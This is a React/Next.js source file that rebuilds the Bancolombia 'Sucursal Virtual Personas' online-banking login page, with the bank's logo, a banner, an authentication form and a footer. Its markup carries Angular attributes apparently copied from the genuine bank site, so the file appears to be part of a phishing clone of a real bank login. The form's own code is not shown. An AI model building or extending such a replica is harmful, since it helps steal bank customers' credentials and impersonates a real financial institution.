import AppLogoBancolombia from "./appPages/components/AppLogoBancolombia";
import Banner from "./appPages/components/Banner";
import AuthForm from "./appPages/components/AuthForm";
import AppFooter from "./appPages/components/AppFooter";

export default function Home() {
    return (
        <div _nghost-ng-c3561947507="">
            <div _ngcontent-ng-c3561947507="" svpdisablecopypaste="">
                <div _nghost-ng-c403088413=""
                >
                    <div
                    _ngcontent-ng-c403088413=""
                    title="Sucursal Virtual Personas"
                    _nghost-ng-c54967524=""
                >
                <main className="svp-main">
                                <div
                                    className="bc-container-fluid trazo"
                                    style={{ backgroundImage: "url(/assets/images/trazo.svg)" }}
                                >
                                    <AppLogoBancolombia />

                                    <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                                        Sucursal Virtual Personas
                                    </h1>

                                    <div className="bc-row bc-justify-content-center form-container">
                                        <div className="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
                                            <Banner />
                                            <AuthForm />
                                        </div>
                                    </div>
                                </div>
                            </main>
                <div
                    _ngcontent-ng-c54967524=""
                    _nghost-ng-c2515275900=""
                >
                </div>

                <AppFooter />

                    </div>

                </div>
            </div>
        </div>
    );
}
